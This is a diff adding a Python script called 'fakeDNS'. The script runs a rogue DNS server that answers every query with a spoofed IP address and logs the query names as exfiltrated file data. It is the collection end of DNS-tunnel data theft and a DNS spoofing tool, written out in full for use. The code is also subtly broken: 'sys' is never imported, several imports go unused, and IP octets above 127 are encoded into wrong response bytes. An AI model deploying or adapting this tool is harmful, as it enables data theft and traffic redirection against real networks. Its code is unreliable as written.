@@ -1,0 +1,88 @@
+import socket
+import argparse
+import dns.resolver
+import scapy.all as scapy
+import netifaces as ni
+
+
+# DECODE DNS QUERY - https://kandi.openweaver.com/python/paulc/dnslib#Community-Discussions
+def decode_dns_query(data):
+	exfil_domain = ""
+	type = ((data[2]) >> 3) & 15
+	if type == 0:
+		start = 12
+		length = data[start]
+		while length != 0:
+			exfil_domain = exfil_domain + str(data[start+1:start+length+1].decode()) + "."
+			start = start + length + 1
+			length = data[start]
+	return exfil_domain
+
+
+# ENCODE BACK RESPONSE
+def encode_dns_response():
+	packet = b""
+	packet += data[:2] + b"\x81\x80"
+	packet += data[4:6] + data[4:6] + b"\x00\x00\x00\x00"    # Questions and Answers Counts
+	packet += data[12:]                                      # Original Domain Name Question
+	packet += b"\xc0\x0c"                                    # Pointer to domain name
+	packet += b"\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04"    # Response type, ttl and resource data length -> 4 bytes
+	packet += bytes(str.join("", map(lambda x: chr(int(x)), resolve.split('.'))), 'UTF-8') # 4bytes of IP
+	udp_socket.sendto(packet, client_addr)
+
+
+
+# argparse for argument parsing
+parser = argparse.ArgumentParser(prog='fakeDNS', usage='%(prog)s -i <iface> -d <domain>', description='Build a simple fake DNS server to spoof DNS requests and catch files exfiltration queries')
+parser.add_argument('-i', '--interface', action='store', type=str, required=True, help='Network interface for incoming connections to listen to')
+parser.add_argument('-r', '--resolve', action='store', type=str, required=False, help='IP address to spoof')
+parser.add_argument('-d', '--domain', action='store', type=str, required=True, help='Domain called in client\'s queries') 
+parser.add_argument('-p', '--port', action='store', type=int, required=False, help='Specify UDP port to listen on (default is 53)')
+
+args = parser.parse_args()
+
+# Interface to bind DNS server to
+interface = args.interface
+domain = args.domain
+if not args.resolve:
+	resolve = '142.251.209.46'		# google.com
+else:
+	resolve = args.resolve
+if not args.port:
+	dns_port = 53
+else:
+	dns_port = args.port
+
+print("----------------------------------------------")
+print("+ Starting FakeDNS-server3 on interface " + interface)
+print("+ Domain:     " + domain)
+print("+ Spoofed IP: " + resolve)
+print("----------------------------------------------")
+
+# New UDP socket (If you already have a DNS server, stop it or the bind will fail)
+try:
+	udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	udp_socket.bind(('', dns_port))
+except Exception as e:
+	sys.exit(e)
+
+try:
+	while True:
+		# RECEIVE UDP packets
+		data, client_addr = udp_socket.recvfrom(1024)
+		#print("data: " + data.hex())
+		#print("Address: " + client_addr[0])
+
+		# DECODE incoming DNS queries
+		domain_exfil = decode_dns_query(data)
+		print("<== " + domain_exfil, end="")
+
+		# ENCODE & SEND fake DNS response
+		encode_dns_response()
+		print(" <== " + resolve)
+
+except KeyboardInterrupt as e:
+	print()
+	print("----------------------------------------------")
+	print("Terminating FakeDNS")
+	udp_socket.close()
